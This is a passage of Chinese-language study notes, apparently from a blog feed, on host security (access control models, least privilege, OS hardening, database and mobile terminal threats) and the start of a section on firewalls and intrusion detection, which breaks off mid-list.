恶意代码防范1）应安装国家安全部门认证的正版防恶意代码软件。对于依附于病毒库进行恶意代码查杀的软件，应及时更新防恶意代码软件版本和恶意代码库；对于非依赖于病毒库进行恶意代码防御的软件，如主动防御类软件，应保证软件所采用特征库的有效性与实时性；对于某些不能安装相应软件的系统，可以采取其他安全防护措施来保证系统不被 恶意代码攻击。 2）主机防恶意代码产品应具有与网络防恶意代码产品不同的恶意代码库。 3）应支持防恶意代码工具的统一管理。 4）应建立病毒监控中心，对网络内计算机感染病毒的情况进行监控。 资源控制1）应通过设定终端接入方式、网络地址范围等条件限制终端登录，如部署堡垒机统一管理终端接入。 2）应根据安全策略设置登录终端的操作超时锁定，超时时间应小于 15 分钟。 3）应对重要服务器进行监视，包括监视服务器的 CPU、硬盘、内存、网络等资源的使用情况，并提供资源使用异常情况下的报警功能。 4）应设定单个用户对系统资源的最大或最小使用限度。 5）应定期对系统的性能和容量进行规划，能够在系统的服务水平降低到预先规定的最小值时进行检测和报警。 6）所有的服务器应全部专用化，不使用服务器进行收取邮件、浏览互联网等客户端操作。 增强要求1）应保证操作系统和数据库系统用户的鉴别信息所在的存储空间，被释放或再分配给其他用户前得到完全清除，无论这些信息是存放在硬盘上还是在内存中。 2）应确保系统内的文件、目录和数据库记录等资源所在的存储空间，被释放或重新分配给其他用户前得到完全清除。 3）应对重要信息资源设置敏感标记。 4）应依据安全策略严格控制用户对有敏感标记的重要信息资源的操作。 操作系统安全机制操作系统是安装在计算机等设备上 ，用来控制其他程序运行，管理系统资源并为用户提供操作界面的系统软件的集合，是连接计算机硬件与上层软件和用户之间的桥梁。操作系统安全是主机安全的基础，主要通过以下机制实现： 1）标识与鉴别：用户身份合法性鉴别、操作系统登录等。 2）访问控制：防止对资源的非法使用、限制访问主体对访问客体的访问权限、DAC&amp;MAC&amp;RBAC。 3）最小特权管理：限制、分割用户及进程对系统资源的访问权限；“必不可少的”权限。 以上机制，归根结底要依靠操作系统的安全配置来实现。 标识与鉴别标识与鉴别的主要作用是控制外界对于系统的访问。其中标识指的是系统分配、提供的唯一的用户ID作为标识，鉴别则是系统要验证用户的身份，一般多使用口令来实现。一旦系统验证了用户身份，就要开始赋予用户唯一标识的用户ID、组ID，还要检查用户申请的安全级、计算特权集、审计屏蔽码：赋予用户进程安全级、特权集标识和 审计屏蔽码。系统负责检查用户的安全级应在其定义时规定的安全级之内，和否则系统拒绝用户的本次登录。 访问控制访问控制的基本概念访问控制（Acecess Control）指系统对用户身份及其所属的预先定义的策略组限制其使用数据资源能力的手段。通常用于系统管理员控制用户对服务器、目录、文件等网络资源的访问。 访问控制的主要目的是限制访问主体对客体的访问，从而保障数据资源在合法范围内得以有效使用和管理。 访问控制包括 3 个要素； 1）主体（Subject，S） ：是指提出访问资源的具体请求的实体。 2）客体（Object，O）：是指被访问资源的实体。 3）访问控制策略 （Attribution，A） 。 ![1]（C：\Users\liao\Documents\node\blog\source_posts\设备和计算安全\1.png） 访问控制模型访问控制的主要功能包括：保证合法用户访问授权保护的网络资源，防止非法的主体进入受保护的网络资源，或防止合法用户对受保护的网络资源进行非授权的访问。访问控制的内容包括认证、控制策略实现和安全审计。 访问控制模型是对上述一系列访问控制规则集合的描述，可以是非形式化的，也可以是形式化的。常用的访问控制模型包括自主访问控制、强制访问控制和基于角色的访问控制，如图。 ![2]（C：\Users\liao\Documents\node\blog\source_posts\设备和计算安全\2.png） 自主访问控制 “自主”主要体现在客体（访问的对象）的所有者有权指定其他主体对该客体的访问权限，这里的所有者也可以是专门具有授予权限的主体，将权限的子集授予其他主体。 访问控制矩阵（Access Control Matrix）是实现自主访问控制机制的概念模型，以二维矩阵规定主体和客体间的访问权限。访问控制实现方法包括：访问控制列表（Access Control List，ACL）和访问能力列表（Access Capacity List）。表中展示了一个基本的访问控制矩阵： 主体 S1 对客体 O1、P2、O3 具有Read 权限，还对 O1 具有Write 权限；主体 S2 对客体O2具有Write权限；主体 S3 对客体O1具有Execute权限，对客体O3具有Read权限。 主体 客体 O1 O2 O3 S1 Read/Write Read Read S2 Write S3 Execute Read 从表中可以看到，任何访问控制策略最终均可被模型化为访问矩阵形式。在访问控制矩阵中行对应于主体，列对应于客体，每个矩阵元素规定了相应的主体对应于相应的客体被准予的访问许可或实施行为。 在具体实现上，访问控制矩阵主要采用以下 2 种方法。 1）访问控制列表：访问控制列表被定义为一个表，它标识计算机操作系统上的每个用户拥有一个特定的系统对象的访问权限，如文件目录或单个文件的。每个对象都有标识其访问控制列表中的安全属性。该列表具有每个系统用户的访问权限条目。最常见的权限包括读取一个文件或目录中的所有文件的能力、写入到一个或多个文件和执行 该文件（如果它是一个可执行文件或程序）的能力，每个操作系统访问控制列表的实现是不同的。比如在Windows中，ACL 与每个系统对象息息相关，每个ACL具有一个或多个访问控制条目，每个ACL包括一个用户或一组用户的名称，用户也可以是一个角色的名字，如程序员或测试人员。对于每个用户、组或角色，访问权限均以比特串表示 ，称为访问掩码。一般情况下，系统管理员或对象所有者为一个对象创建访问控制列表。 访问控制列表的特点是：访问控制矩阵按列索引 ，标识出每个客体可以被访问的主体及权限。 2）访问能力列表：访问能力列表是以用户为中心建立的访问权限表。与ACL不同，表中规定了该用户可访问的文件名及权限，利用此表可方便地查询一个主体的所有授权。检索具有授权访问特定客体的所有主体，则需查遍所有主体的访问能力列表。 访问控制列表的特点是： 访问控制矩阵按行索引，标识出每个主体可访问的客体及权限。 强制访问控制”强制“体现在每个进程、文件、IPC 客体都被 Administrator 或 OS 赋予了不可改变的安全属性，这些安全属性不能再由用户自己进行修改，实际应用中常常将二者结合起来使用。用户使用自主防问控制防止其他用户非法入侵自己的文件，强制访问控制则作为更有力的安全保护方式，使用户不能通过意外事件和有意识的误操作来逃避安全控制。 强制访问控制（MAC）是系统强制主体服从访问控制策略，是由系统对用户所创建的对象，按照规则控制用户权限及操作对象的访问。主要特征是对所有主体及其所控制的进程、文件、段、设备等客体实施强制访问控制。 MAC的安全级别常用的为4级：绝密级（T）、秘密级（S）、机密级（C） 和无级别级（U），其中T&gt;S&gt;C&gt;U。系统中的主体（用户，进程）和客体（文件，数据）都分配安全标签，以标识安全等级。 基于强制的访问控制，存在不同的安全模型。 机密性安全模型——BLP模型：BLP模型是由 D.Elliott Bell 和 Leonard J.LaPadula 于1973年提出的一种适用于军事安全策略的计算机操作系统安全模型，它是最早、也是最常用的计算机多级安全模型之一。BLP 将主体定义为能够发起行为的实体，如进程；将客体定义为被动的主体行为承担者，如数据、文件等；将主体对客体的 访问分为r只读、w读写、a只写、e执行与 c控制等访问模式，其中c控制是用来描述该主体用来授予或者撤销另一主体对某一个客体的访问权限的能力。BLP 的安全策略包括两个部分： 自主安全策略和强制安全策略。自主安全策略借助访问矩阵实现，强制安全策略包括简单安全特性和 * 特性，系统对所有的主体和客体都分配一个访问类属性，包括密级和范畴，系统通过比较主体和客体的访问类属性来控制主体对客体的访问。 完整性安全模型——Biba 模型：BLP 模型注重了机密性，但是忽略了完整性保护，于是后人对 BLP 模型进行了一些改进。1977 年 Biba 等人提出了第一个完整性安全模型一一Biba 模型 ，主要应用类似 BLP 模型的规则来保护信息的完整性。Biba 模型提出的不是一个唯一的安全策略，而是一个安全策略系列。比如非自主安全策略里的对于主体/客体的下限标记策略，使得主体、客体的完整级别动态变化；自主安全策略里的 ACL 和环机制等。 Biba 模型的优势在于其简单性及与 BLP 模型相结合的可能性。简单性体现在Biba的严格完整性策略是BLP机密性策略的对偶，所以它的实现是直观和易于理解的；基于Biba和BLP的相似性，二者有可能结合产生集机密性与完整性于一身的安全模型。 但是其不足是： 1）完整性标签确定的困难性。 2）Biba 模型最主要的完整性目的是保护数据免受非授权用户的恶意修改，同时其认为内部完整性威胁应该通过程序验证来解决，但是在模型中并没有包括这个 要求。 3）Biba 和 BLP 模型的结合看似容易，实则困难，而且即使结合之后，也无法抵御 病毒攻击 完整性安全模型——Clark-Wilson（CW）完整性模型 1987 年 David Clark 和 David wilson 提出的完整性模型具有里程碑意义，它是完整意义上的完整性目标、策略和机制的起源。为了体现用户完整性，CW 模型提出了职责隔离目标；为了保证数据完整性，CW模型提出了应用相关的完整性验证进程；为了建立过程完整性，CW 模型定义了对于转换过程的应用相关验证；为了约束用户、进程和数据之间的关系，CW 模型使用了三元组结构。 CW 模型的核心在于以良构事务（Well-formal Transaction）为基础实现在商务环境中所需的完整性策略。良构事务是指一个用户不能任意操纵数据，只能用一种能够确保数据完整性的受控方式来操作数据。为了确保数据项仅仅能被良构事务操作，首先得确认一个数据项仅仅能被一组特定的程序来操作，而这些程序是经过验证特殊构造，并且被正确安装的。 多策略安全模型一一中国墙（Chinese Wall）模型，和根据现实的商业策略提出了中国墙模型，该模型试图解决的问题是为了保护相互竞争的客户，咨询公司需要在代理间建立密不可透的墙，比如分析员面对客户银行A、石油公司A、石油公司B，一旦分析员访问了石油公司A（或B），则都不能再访问石油公司B（或A），因为A和B处于竞争关系，因而用户只能访问其中之一；初始之时用户可以随意访问任意一个客体，但是一旦访问过一个客体，就不能再访问与该客体有竞争关系的其他客体，或者叫不能访问其利益冲突类。这里体现了自由选择和强制控制的微妙组合。 基于角色的访问控制基于角色的访问控制（RBAC）模型在用户和访问权限之间引入了角色的概念，它的基本特征是根据安全策略划分角色，对每个角色分配操作许可；为用户指派角色，用户通过角色间接地对信息资源进行访问，如图所示。 ![3]（C：\Users\liao\Documents\node\blog\source_posts\设备和计算安全\3.png） 在RBAC模型中权限与角色相关联，用户通过取得适当的角色从而获得合适的权限。这可以有效地简化权限管理。在新的应用中同一角色可以授予新的权限，当需要时应用权限可以从角色上被撤销，而无须修改用户的角色，同样可修改用户的角色，使其具有复杂的权限 ，而不需要修改角色权限。 角色是一定数量的权限的集合，即完成一项任务必须访问的资源及相应操作权限的集合。角色作为一个用户与权限的代理层，表示为权限和用户的关系，所有的授权应该给予角色而不是直接给用户或用户组。 基于角色的访问控制是通过对角色的访问所进行的控制，它使权限与角色相关联，用户通过成为适当角色的成员而得到其角色的权限，可极大地简化权限管理。 RBAC 模型的授权管理方法，主要有 3 种： 根据任务需要定义具体不同的角色。 为不同角色分配资源和操作权限。 给一个用户组（Group，权限分配的单位与载体）指定一个角色。 RBAC 支持 3 个著名的安全原则：最小权限原则、责任分离原则和数据抽象原则。 最小特权原则最小特权原则是系统安全中最基本的原则之一。所谓最小特权（Least Privilege）， 指的是在完成某种操作时所赋予系统中每个主体（用户或进程） 必不可少的特权。 最小特权原则一方面给予主体“必不可少”的特权，这就保证了所有的主体都能在所赋予的特权之下完成所需要完成的任务或操作；另一方面，它只给予主体“必不 可少”的特权，这就限制了每个主体所能进行的操作。 最小特权原则要求每个用户和程序在操作时应当使用尽可能少的特权，而角色多许主体以参与某特定工作所需要的最小特权去签入（Sign）系统。被授权拥有强力角色（Powerful Roles）的主体，不需要动辑运用到其所有的特权，只有在那些特权有实际需求时，主体才去运用它们。如此一来，将可减少由于不注意的错误或是侵入者伪装为合法主体所造成的损坏发生，限制了事故、错误或攻击带来的危害。它还减少了特权程序之间潜在的相互作用，从而使对特权无意的、没必要的或不适当的使用不太可能发生。这种想法还可以引申到程序内部：只有程序中需要那些特权的最小部分才拥有特权。 最小特权在安全操作系统中占据了非常重要的地位，依据“最小特权”原则对系统管理员的特权进行分化，每个用户只能拥有刚够完成工作的最小权限。然后根据系统管理任务设立角色，依据角色划分权限，每个角色各负其责，权限各自分立，一个管理角色不拥有另一个管理角色的特权。如当入侵者取得系统管理员权限后欲访问一个高安全级别的文件，则很有可能被拒绝。因为用户（包括系统管理员）在登录后默认的安全级别是最低的，他无法访问高级别的文件，而安全级别的调整只有通过安全管理员才能完成。因此，安全管理员只要对敏感文件配置了合理的安全标记，系统管理员就无法访问这些文件。由此可知，最小特权对系统不同角色的权限进行了有力的限制。 操作系统安全加固考虑到操作系统结构体系本身的固有缺陷，功能多样性所带来的风险及守护进程与后门存在的可利用漏洞，操作系统安全加固需要针对不同方面的不同特点进行专项配置管理。 1）操作系统结构体系的缺陷。操作系统本身有内存管理、CPU 管理、外设的管理，每个管理都涉及一些模块或程序，如果这些程序里面存在问题，比如内存管理的问题，外部网络的一个连接过来，刚好连接一个有缺陷的模块，可能出现的情况是，计算机系统会因此崩溃。所以，有些黑客往往是针对操作系统的不完善进行攻击，使计算机 系统，特别是服务器系统立刻瘫痪。 2）操作系统支持在网络上传送文件、加载或安装程序，包括可执行文件，这些功能也会带来不安全因素。网络的一个很重要的功能就是文件传输功能，比如 FTP，这些安装程序经常会带一些可执行文件，而这些可执行文件都是人为编写的程序，如果某个地方出现漏洞，那么系统可能就会造成崩溃。像远程调用、文件传输，如果生产厂家或 个人在上面安装“间谍”程序，那么用户的整个传输过程、使用过程都会被别人监视到，所有的这些传输文件、加载的程序、安装的程序、执行文件，都可能给操作系统带来安全的隐患。所以，建议尽量少使用一些来历不明，或者无法证明它的安全性的软件。 3）操作系统不安全的一个原因在于它可以创建进程，支持进程的远程创建和激活，支持被创建的进程继承创建的权利，这些机制提供了在远端服务器上安装“间谍” 软件的条件。若将“间谍”软件以打补于的方式“打”在一个合法用户上，特别是“打”在一个特权用户上，黑客或“间谍”软件就可以使系统进程与作业的监视程序监测不到它的存在。不过，将传统 root 进行分权可以有效地解决这个问题，如深度操作系统使用 capabi Lities 与审计、系统、安全管理员三权分立的方法可以有效降低特权进程所造成的危害，并将其及早发现。 4）操作系统有些守护进程，它是系统的一些进程，总是在等待某些事件的出现，比如说用户有没有按键盘或鼠标，或者做别的一些处理。一些监控病毒的监控软件也是守护进程，这些进程可能是好的，比如防病毒程序，一有病毒出现就会被捕捉到。但是有些进程是一些病毒，一碰到特定的情况，比如碰到7 月 1 日，它就会把用户的硬盘格式化，这些进程就是很危险的守护进程，平时它可能不起作用，可是在某些条件发生时，它才发生作用，如果操作系统有些守护进程被人破坏掉就会出现这种不安全的情况。 5）操作系统会提供一些远程调用功能，所谓远程调用就是一台计算机可以调用远程一个大型服务器里面的一些程序，可以提交程序给远程的服务器执行，如 telnet。远程调用要经过很多的环节，中间的通讯环节可能会出现被人监控等安全问题。解决此问题的方法之一是采用非对称加密通信、最小权限原则与纵深防御。在深度操作系统里缺 省，仅在非公知端口开设了 SSL 安全登录，而且通过防火墙限制了有效端口，并限制了远程用户的权限，这样可以有效防御远程调用的攻击。 6）操作系统的后门和漏洞。后门程序是指那些绕过安全控制而获取对程序或系统访问权的程序方法。在软件开发阶段，程序员利用软件的后门程序得以方便修改程序设计中的不足。一旦后门被黑客利用，或在发布软件前没有删除后门程序，容易被黑客当成漏洞进行攻击 ，造成信息泄密和丢失。此外，操作系统的无口令的入口，也是信息安全的一大隐患。 7）尽管操作系统的漏洞可以通过版本的不断升级来克服，但是系统的某一个安全漏洞就会使得系统的所有安全控制毫无价值。当发现问题到升级这段时间 ，一个小的漏洞就足以使整个网络瘫痪。 数据库安全配置随着信息系统对数据库的依赖性越来越大，拖库现象（数据库中的数据被窃取）频发，盗取数据库的技术在不断提升。虽然数据库的防护能力也在提升，但相比攻击手段来说，单纯的数据库防护还是心有余而力不足。数据库受到的威胁来源如下。 内部人员错误数据库安全的一个潜在风险就是“非故意的授权用户攻击”和内部人员错误。这种安全事件类型的最常见表现包括：由于不慎而造成意外删除或泄露，非故意的规避安全策略。在授权用户无意访问敏感数据并错误地修改或删除信息时，就会发生第一种风 险。在用户为了备份或“将工作带回家”而做了非授权的备份时，就会发生第二种风险。虽然这并不是一种恶意行为，但很明显，它违反了公司的安全策略，并会造成数据存放到存储设备上，在该设备遭到恶意攻击时，就会导致非故意的安全事件。例如，笔记本电脑就能造成这种风险。 社会工程由于攻击者使用的高级钓鱼技术，在合法用户不知不觉地将安全机密提供给攻击者时 ，就会发生大量的严重攻击。在这种情况下，用户会通过一个受到损害的网站或通过一个电子邮件响应将信息提供给看似合法的请求。应当通知员工这种非法的请求，并教育他们不要做出响应。此外，还可以通过适时地检测可疑活动，来减轻成功的钓鱼攻击的影响。数据库活动监视和审计可以使这种攻击的影响最小化。 内部人员攻击很多数据库攻击源自内部。当前的经济环境和管理都有可能引起员工的不满，从而导致内部人员攻击的增加。这些内部人员受到贪欲或报复欲的驱使，且不受防火墙及入侵防御系统等的影响，容易给企业带来风险。 错误配置黑客可以使用数据库的错误配置控制“肉机”访问点，借此绕过认证方法并访问敏感信息。这种配置缺陷成为攻击者借助特权提升发动某些攻击的主要手段。如果没有正确设置数据库的配置，非特权用户就有可能访问未加密的文件，未打补丁的漏洞就有可能导致非授权用户访问敏感数据。 未打补丁的漏洞如今攻击已经从公开的漏洞利用发展到更精细的方法，并敢于挑战传统的入侵检测机制。漏洞利用的脚本在数据库补丁发布的几小时内就可以被发到网上，当即就可以使用的漏洞利用代码，再加上了几十天的补丁周期（在多数企业中如此），实质上几乎把数据库的大门完全打开了。 高级持续性威胁高级持续性威胁，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。其攻击的原理相对于其他攻击形式更为高级和先进，其高级性主要体现在发动攻击之前需要对攻击对象的业务流程和目标系统进行精确的收集，在此收集的过程中，此攻击会主动挖掘被攻击对象受信系统和应用程序的漏洞，在这些漏洞的基础上形成攻击者所需的命令控制网络。其行为没有采取任何可能触发警报或者引起怀疑的行动，因此更接近于融入被攻击者的系统或程序。鉴于数据库攻击涉及成千上万甚至上百万的记录，所以其日益增长和普遍。通过锁定数据库漏洞并密切监视对关键数据存储的访问，数据库的专家们可以及时发现并阻止这些攻击。 PC 终端安全PC 终端安全指的是内部员工使用的PC电脑，它们是内部作业的终端，其安全非常重要。 内部 PC 终端也是接入内部网络中，其安全对整体的安全十分重要。而目前病毒和木马繁多，传播广泛，对 PC 终端的安全构成巨大威胁，因此有必要采取相关技术来保证其安全。 1）终端资产管理：通过对终端的资产注册和管理，确保终端的实名制管理，加强终端网络准入的安全管控和审计，并可以实时监控终端硬件变化，避免硬件或外设的丢失。 2）终端防病毒管理：通过统一的防病毒平台，对所有的终端实现统一的终端防病毒，以及保障病毒库的实时更新，并实现全行终端病毒感染情况的统计。 3）终端补丁管理：通过补丁管理，实现终端系统、应用漏洞补丁的验证。多采用统一分发、安装的方式确保补丁的及时修复，减少终端系统的脆弱性，并通过报表展示全行终端的补丁修复率。 4）终端桌面管理：通过终端桌面管理平台，加强终端的应用安全管理，统一地对终端系统的安全组策略、主机名、外设、安装及运行软件的黑白名单等进行管控，加强终端运行环境的安全性，同时为数据防泄密提供管理手段。 5）终端准入管理：为确保网络接入终端的合法性和安全性控制，通过统一的终端网络准入管理平台，对所有入网的终端统一采取终端使用人员的身份验证、接入终端资产合法性的验证，接入终端运行环境合法性的验证等手段，来进一步保障全行网络的安全性和稳定性。 智能终端安全随着通信技术和移动互联网的高速发展，移动智能终端成为访问互联网的主要方式之一。由于移动智能终端的功能不断强大和大面积普及，移动智能终端已成为人们日常生活不可或缺的用品。据 IDC 数据显示，2012 年第二季度，中国移动手机出货量达到 8700 万部，其中 51% 为智能手机。在 2012 年全球智能手机市场中，中国市场份额占比达 26.5% ，美国占 17.8%，中国已经超越美国成全球最大智能手机市场。 由于移动智能终端本身的开放性、灵活性，以及移动智能终端的广泛应用，给移动用户乃至国家在信息安全方面造成极大威胁。移动智能终端面临着各种各样的安全问题， 如恶意软件可以控制移动智能终端后台发送短信及后台联网等，造成话费损失；恶意软件还可以在用户不知情的情况下，监听通话、获取用户位置信息、读取和删除用户的个人数据等，造成用户隐私的泄露。 移动智能终端安全架构移动智能终端安全架构以开放式操作系统为核心，这是移动智能终端的重要特征。移动智能终端的安全架构包括三大层面：硬件层、操作系统层和应用软件层。移动智能终端的安全架构是首先保证安全的硬件，通过安全的硬件绑定安全的操作系统，安全的操作系统绑定安全的应用软件，这样层层绑定从而实现移动智能终端整体的安全。移动 智能终端通常有丰富的外围接口，这些外围接口在增强用户体验的同时增加了病毒传播的风险，一些攻击者会通过这些外围接口对移动智能终端进行攻击，从而威胁移动智能终端的安全。另外随着移动智能终端的智能化及存储空间的不断增大，用户的很多重要数据存储在终端中，如通讯录、短信、日程安排等，终端中的大量隐私一旦遭到泄露，那么将对用户造成很大的危害，因此用户数据的保护也是确保移动智能终端安全的非常重要的方面。 移动智能终端面临的威胁国内移动智能终端服务在迅速发展的同时，原先在PC电脑中上演的信息安全问题也在移动终端上再次发生，设备制造商、网络服务商、应用服务提供商和最终客户都已经意识到此问题，并且因为移动智能设备的便利性和时时在线的属性，导致其所面临的信息安全风险更为严重。移动智能终端本身普遍固有的信息安全风险如下： 1）应用与系统软件层：应用软件与数据层包括在操作系统之上运行的各类应用程序、存储和处理的各类数据信息。其主要风险来自于移动恶意软件，可在用户不知情或未授权的情况下自动安装、和运行，窃取或自改终端敏感信息、恶意扣费等，同时也能借助移动网络进行更大范围的恶意传播。 2）操作系统层：操作系统是智能终端上层应用软件运行的基础，提供了丰富、开放的 API 接口 ，因此会存在功能接口被非法滥用的安全风险，这也是导致恶意软件日益增加的主要原因之一。部分终端操作系统自身隐藏的后门或漏洞使终端存在被远程控制的风险，如Android可被Google云端服务器远程控制。 3）硬件层：智能终端硬件层主要指其物理器件、芯片及相关驱动等，可能面临探针、电磁辐射监控等物理攻击，这些攻击通过硬件道向工程或漏洞破解加密算法和密钥等方式窃取或自改硬件中的敏感数据。较典型的问题如 SIM 卡克隆，目前由于针对硬件层的攻击成本较高，因此实际发生的案例较少。 移动智能终端安全对应策略由于移动智能终端的安全威胁可归结为移动智能终端（信宿）、移动应用商店（渠 道）和第三方应用服务器（信源）3 个方面，因此应对相关安全威胁的措施手段应主要针对移动智能终端自身安全能力、提供应用软件下载和销售的应用商店及向应用软件提供升级和内容服务的第三方服务器 3 个环节。将这几个关键环节的安全控制住，就能极大地提高移动智能终端的安全。 在移动智能终端环节 ，通过终端安全技术攻关、安全标准引导及进网管理规范提升终端安全能力。在终端安全技术攻关方面，扶持国内操作系统、芯片等核心技术的研发和产业发展，争取对移动智能终端安全管理的主动权和控制力，加大国家项目中对于移动智能终端的软硬件技术、安全技术、系统软件和应用软件安全漏洞后门分析及处置技术等专项研究的力度，扶持国内企业构建自主可控的移动智能终端安全技术能力与产品方案；在安全标准引导方面，系统梳理并不断完善移动智能终端安全标准体系，推动相关安全标准的制定和贯彻实施，并根据实施情况及时完善标准；在终端进网管理环节，加强对智能终端进网安全检测内容及测试方法手段的研究，补充对硬件芯片及外围接口、用户数据保护、操作系统漏洞、操作系统 API 调用、预置应用等关键环节的安全保障技术和管理措施要求，同时持续跟踪新出现的移动智能终端，如可穿戴设备等，将新型终端及时纳入进网检测。 在移动应用商店环节，积极推进第三方权威认证实验室建设，开展对应用软件、应用商店和第三方服务器的第三方权威安全监测和评估，督促企业落实相关安全要求。此外还需制定针对各类应用软件的安全技术标准，加强对应用软件安全评估工具和方法的研究 ，保障安全评估高效客观开展。从软件研发源头提高软件质量和安全水平，在软件研发、上线、运行的整个生命周期内实施安全措施保障。对于缺乏应用软件检测能力的移动应用商店经营者，可以要求其委托权威的第三方终端软件测评认证机构按照相关规定代为进行应用软件的测试和认证。 在第三方应用服务器环节，应依照《互联网信息服务管理办法》进一步加强管理。 同时，针对境外移动应用商店和新型第三方应用平台的运营者，要与其进行积极沟通，要求其遵守国内的法律法规；远期可通过谈判或法律法规等手段，要求其将服务器搬移到境内，纳入国内法律法规管理体系。同时，要求基础电信运营企业加强业务拨测、内容过滤等安全机制，并要求 IDC/ISP 加强业务接入管理，研究实施 DC/ISP 层面的恶意代码和不良内容过滤技术手段。]]></content>
  </entry>
  <entry>
    <title><![CDATA[网络和通信安全]]></title>
    <url>%2F2019%2F10%2F08%2F%E7%BD%91%E7%BB%9C%E5%92%8C%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[网络和通信安全是指网络系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的原因而遭受到破坏、更改、泄露，系统连续可靠正常地运行，网络服务不中断，从而确保网络数据和通信的可用性、完整性和保密性。网络和通信安全保护的对象是网络系统的硬件、软件。对于重要信息系统来说，网络和通信安全保护对信息系统的访问、读写等操作进行保护和控制，数据传输受到保护，避免出现病毒、非法存取、拒绝服务和网络资源非法占用和非法控制等威胁，制止和防御网络黑客的攻击。 防火墙技术防火墙概述防火墙这个词来源于建筑词汇，用于限制（潜在的） 火灾在建筑内部的蔓延，后被引申至信息安全领域中访问控制、边界整合类的产品，防火墙是一种访问控制技术，在某个机构的网络和不安全的网络之间设置障碍，阻止对信息资源的非法访问。 防火墙的作用防火墙的作用通常包括以下几个方面。 1）防火墙是网络安全的屏障 一个防火墙（作为阻塞点、控制点）能极大地提高内部网络的安全性，并通过过滤不安全的服务而降低风险。同时，防火墙可以保护网络免受基于路由的攻击， 2）防火墙可以强化网络安全策略 通过以防火墙为中心的安全方案配置，能将所有安全软件（如口令、加密、身份认证、审计等） 配置在防火墙。与将网络安全问题分散到各个主机上相比，防火墙的集中安全管理更经济。如在网络访问时，一次一密口令系统和其他的身份认证系统完全可以不必分散在各个主机上，而可以集中在防火墙一身上。 3）对网络存取和访问进行监控审计 如果所有的访问都经过防火墙，那么，防火墙就能记录下这些访问并做出日志记录，同时也能提供网络使用情况的统计数据。当发生可疑动作时，防火墙能进行适当的报警，并提供网络是否受到监测和攻击的详细信息。 4）防止内部信息的外泄 通过利用防火墙对内部网络的划分，可实现内部网重点网段的隔离，从而限制了局部重点或敏感网络安全问题对全局网络造成的影响。 防火墙的功能防火墙作为不同安全域间的阻塞点和控制点，极大地提高了内部网络的安全性，它通过过滤不安全的服务而降低风险。从其发生发展的情况来看，防火墙的功能日益成熟。 1）路由功能 外网口、内网口、DMZ 区不在同一网段时，防火墙启用路由模式，此时的防火墙相当于一台路由器在使用。 地址转换功能 网络地址转换 （Network Address Translation，NAT） 被广泛应用于各种类型的 Internet 接入方式和网络中。原因很简单，NAT不仅完美地解决了IP地址不足的问题，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机。 3）控制访问功能 防火墙以其阻塞点的身份实现监视和控制，通过服务控制、方向控制和用户控制实现访问控制的功能。 4）负载均衡功能 负载均衡是一种廉价有效透明的方法，以扩展现有网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性的技术就是负载均衡（Load Balance）。 5）VPN 功能 虚拟专用网（VPN）被定义为通过一个公用网络（通常是Internet）建立一个临时的、安全的连接，是一条穿过混乱的公用网络的安全、稳定的隧道，保证数据的安全传输。 6）QoS功能 QoS的英文全称为“Quality of Service”，中文名为“服务质量”。QoS是网络的一种安全机制，是在带宽分配、网络阻塞等问题中常用的一种技术。在正常情况下，如果网络只用于特定的无时间限制的应用系统，并不需要QoS，比如 WEB 应用，或E-Mail设置等。但是对关键应用和多媒体应用就十分必要。当网络过载或拥塞时，QoS能确保重要业务量不受延迟或丢弃，同时保证网络的高效运行。 防火墙的分类根据不同的分类方式，防火墙有不同的类别。 从防火墙的存在形式来分的话，可以分为软件防火墙和硬件防火墙。 从防火墙部署的位置来看，可以分为个人防火墙和网络防火墙。 从架构实现方式来看，硬件防火墙一般是基于三种平台去实现：X86、NP架构、ASIC架构。 从技术原理上讲，防火墙总体来讲可分为四大类：简单包过滤型、状态检测型、应用代理型、内核检测型。 防火墙应用场景以下列举防火墙的部分应用场景： 1）在移动办公区部署防火墙实现连接互联网接入同时与内网各个区域实现安全隔离。 2）在开发测试区出口部署防火墙，进行访问控制。 3）在外网访问区域，采用双机部署模式，采用双宛余链路互联，提高业 务系统的可用性。 4）在应用APP + DB区域，提供 APP 与 DB 之间 的互访，并于内网前置机进行通信。 5）在内外网之间采用双机部署模式，实现双宛余链路互联，实现内外网安全隔离。 6）在第三方支付系统的出口部署防火墙，实现与其他业务系统的隔离和安全防护。 网络威胁检测与防护技术IDS概念入侵是指在非法或者未经授权的情况下，试图存取或处理系统或网络中的信息，或破坏系统或网络的正常运行，致使系统或网络的可用性、机密性和完整性受到破坏的故意行为。入侵检测 ，顾名思义，是对和入侵行为的发觉。入侵检测技术是为保证计算机系统的安全而设计与配置的一种能够及时发现并报告系统中未授权或异常现象的技术，是 一种用于检测计算机网络中违反安全策略行为的技术，是通过数据的采集和分析实现对入侵行为检测的技术。 进行入侵检测的软件与硬件的组合便是入侵检测系统（简称 IDS）。入侵检测是防火墙的合理补充，帮助系统对付网络攻击，扩展了系统管理员的安全管理能力（包括安全审计、监视、进攻识别和响应），提高了信息安全基础结构的完整性。入侵检测被认为是防火墙之后的第二道安全闸门，在不影响网络性能的情况下能对网络进行监测， 从而提供对内部攻击、外部攻击和误操作的实时保护。 入侵检测系统的功能和作用由于防火墙处于网关的位置，不可能对进出攻击做太多的判断，否则会严重影响网络性能，如果把防火墙比作大门警卫的话，入侵检测系统就是监控摄像机。入侵检测系统通过监听的方式获取网络的和运行状态数据，判断其中是否含有攻击的企图，并通过各种手段向管理员报警，不但可以发现外部的攻击，也可以发现内部的恶意行为。 当 IDS 发现一个可疑的恶意威胁（事件）后，它会记录该事件并采取适当的行动。 该行动可能是继续登录、发送报警、重定向攻击。如果该威胁是高风险的，IDS 将提醒相关人员。报警可以通过E-Mail、SNMP、短信发送到移动设备或者控制台。IDS 支持深度安全原理，并可用于检测多种威胁事件。 入侵检测系统的功能很多，比如监测并分析用户和系统的活动；检查系统配置和漏洞； 评估系统关键资源和数据文件的完整性； 识别已知的攻击行为； 统计分析异常行为； 对操作系统进行日志管理，并识别违反安全策略的用户活动； 针对已发现的攻击行为做出适当的反应，如千警、终止进程等。具体来看，入侵检测系统的功能包括但不限于以下内容: 1）密码破解。 2）协议攻击。 3）缓冲区溢出。 4）模拟尝试。 5）安装工具包。 6）恶意命令。 7）软件漏洞攻击。 8）非法数据操作。 9）未经授权的文件访问。 10） 